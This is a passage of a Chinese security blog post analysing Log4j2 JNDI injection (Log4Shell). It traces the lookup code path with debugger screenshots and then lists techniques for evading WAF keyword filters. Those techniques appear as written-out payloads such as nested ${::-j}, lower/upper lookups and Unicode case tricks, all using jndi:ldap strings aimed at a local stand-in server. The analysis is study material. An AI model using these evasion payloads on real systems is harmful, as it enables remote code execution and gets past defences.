+<p>这里判断是不是<code>lookup</code>,用的是,进入for循环</p>
+<p>这个for循环是用来截取<img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c.png"
+	width="417"
+	height="38"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c_hue66d084ef613596330b00ba3a4d7f253_3304_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c_hue66d084ef613596330b00ba3a4d7f253_3304_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1097"
+		data-flex-basis="2633px"
+	
+>里<code>${}</code>里的内容</p>
+<p>然后进入<code>replace</code></p>
+<p><code>StrSubstitutor</code></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337.png"
+	width="704"
+	height="242"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337_hu061d7ae26ef304c85f09d2511f71764a_26293_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337_hu061d7ae26ef304c85f09d2511f71764a_26293_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="698px"
+	
+></p>
+<p>再进入<code>substitute</code></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea.png"
+	width="859"
+	height="97"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea_hua6aa3cfb684bbda9efeb9950c5407df8_14327_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea_hua6aa3cfb684bbda9efeb9950c5407df8_14327_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="885"
+		data-flex-basis="2125px"
+	
+></p>
+<p>进入<code>substitute</code></p>
+<p>然后就是进入while循环,一连串的判断,循环,看不懂</p>
+<p>知道出循环了后</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba.png"
+	width="766"
+	height="230"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba_hub255f56122d86f78dd2025fe6bd99165_35323_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba_hub255f56122d86f78dd2025fe6bd99165_35323_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="799px"
+	
+></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1.png"
+	width="827"
+	height="63"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1_hu5532b249e62696412854dc81a4411fed_10122_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1_hu5532b249e62696412854dc81a4411fed_10122_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1312"
+		data-flex-basis="3150px"
+	
+></p>
+<p>能看到此时<code>varNameExpr</code>是<code>jndi:ldap://127.0.0.1:8085/XFaOTtBf</code>,去掉了<code>${}</code></p>
+<p>继续跟进跳到</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376.png"
+	width="832"
+	height="97"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376_hu1170b8a824fc0933b8bfc85d405d2387_13692_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376_hu1170b8a824fc0933b8bfc85d405d2387_13692_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="857"
+		data-flex-basis="2058px"
+	
+></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc.png"
+	width="489"
+	height="66"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc_hu7a8a76f0f669b995c1845f8d5b54eca7_5405_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc_hu7a8a76f0f669b995c1845f8d5b54eca7_5405_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="740"
+		data-flex-basis="1778px"
+	
+></p>
+<p>varName作为参数,resolveVariable这里是解析时支持关键词有<code>{date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j}</code></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593.png"
+	width="392"
+	height="115"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593_huab7d3b2d20fa13503c8256f9b3ceb724_14054_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593_huab7d3b2d20fa13503c8256f9b3ceb724_14054_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="340"
+		data-flex-basis="818px"
+	
+></p>
+<p>像一开始试的<code>java:os</code>,这里就有</p>
+<p>跟进<code>resolveVariable</code>方法</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62.png"
+	width="655"
+	height="224"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62_hu035b884c9ad5530429ae6c25332753f3_27465_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62_hu035b884c9ad5530429ae6c25332753f3_27465_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<p>看到<code>lookup</code>方法了</p>
+<p>后续跟进也能看到的确实Jndi的lookeup方法</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393.png"
+	width="993"
+	height="314"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393_hu2bcd2f2390aa15e35d8cda902d489199_69665_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393_hu2bcd2f2390aa15e35d8cda902d489199_69665_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="758px"
+	
+></p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd.png"
+	width="863"
+	height="530"
+	srcset="/java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd_hu982c0bea1afc64e0832984057d1808c1_75872_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd_hu982c0bea1afc64e0832984057d1808c1_75872_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="390px"
+	
+></p>
+<h3 id="小结调试">小结调试
+</h3><ol>
+<li>先判断内容中是否有<code>${}</code>，然后截取<code>${}</code>中的内容，得到我们的恶意payload <code>jndi:xxx</code></li>
+<li>后使用<code>:</code>分割payload，通过前缀来判断使用何种解析器去<code>lookup</code></li>
+<li>支持的前缀包括 <code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，后续我们的绕过可能会用到这些。</li>
+</ol>
+<h2 id="针对-waf-的常规绕过">针对 WAF 的常规绕过
+</h2><ul>
+<li>出发点是基于很多 WAF 检测是否存在 <code>jndi:</code> 等关键词进行判断</li>
+</ul>
+<h3 id="1-利用分隔符和多个--绕过">1. 利用分隔符和多个 <code>${}</code> 绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">logg.info(&#34;${${::-J}ndi:ldap://127.0.0.1:1389/Calc}&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-通过-lower-和-upper-绕过">2. 通过 lower 和 upper 绕过
+</h3><p><font style="color:rgb(80, 80, 92);">这一点，因为我们之前说允许的字段是这一些<br>
+</font><code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code><font style="color:rgb(80, 80, 92);">，其中就有 lower 和 upper</font></p>
+<p><font style="color:rgb(80, 80, 92);">同时也可以利用 lower 和 upper 来进行 bypass 关键字</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">logg.info(&#34;${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}&#34;);
+</span></span><span class="line"><span class="cl">logg.info(&#34;${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(80, 80, 92);">同时也可以利用一些特殊字符的大小写转化的问题</font></p>
+<ul>
+<li><font style="color:rgb(80, 80, 92);">ı =&gt; upper =&gt; i (Java 中测试可行)</font></li>
+<li><font style="color:rgb(80, 80, 92);">ſ =&gt; upper =&gt; S (Java 中测试可行)</font></li>
+<li><font style="color:rgb(80, 80, 92);">İ =&gt; upper =&gt; i (Java 中测试不可行)</font></li>
+<li><font style="color:rgb(80, 80, 92);">K =&gt; upper =&gt; k (Java 中测试不可行)</font></li>
+</ul>
+<h3 id="3编码绕过">3.编码绕过
+</h3><p>unicode编码或者hex编码</p>
+<h3 id="4-总结一些-payload">4. 总结一些 payload
+</h3><ul>
+<li>原始payload</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&#34;${jndi:ldap://127.0.0.1:1234/ExportObject}&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(80, 80, 92);">对应的绕过手段</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject};
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}&#34;;
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}&#34;;
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}&#34;;
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Feb 19, 2025 07:24 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/jackson/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/jackson/1.cef2fe99533407212681f8679c82e2e5_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Jackson反序列化"
+                        
+                        data-hash="md5-zvL&#43;mVM0ByEmgfhnnILi5Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Jackson反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26.cef2fe99533407212681f8679c82e2e5_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson各版本绕过分析"
+                        
+                        data-hash="md5-zvL&#43;mVM0ByEmgfhnnILi5Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson各版本绕过分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/25.090c9fb095cfbe1b9147302afa798b94_hueda339f65764f7844afcc8ab1b48c07c_207061_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson1.2.62-1.2.68版本反序列化漏洞"
+                        
+                        data-hash="md5-CQyfsJXPvhuRRzAq&#43;nmLlA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson1.2.62-1.2.68版本反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/24.536555907a9796a67203136e7846373a_huf13ef49576a26e60058adb4232b89236_327164_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson-1.2.24版本漏洞分析"
+                        
+                        data-hash="md5-U2VVkHqXlqZyAxNueEY3Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Fastjson-1.2.24版本漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/23.18927b89b7cec8d6042141c403d831a0_huf9676a8800dc8cf9723afb54e95056be_155376_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post java动态代理"
+                        
+                        data-hash="md5-GJJ7ibfOyNYEIUHEA9gxoA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java动态代理</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+  body {
+    background: url(https://gsygsr.github.io/background/58.jpg) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+    </body>
+</html>
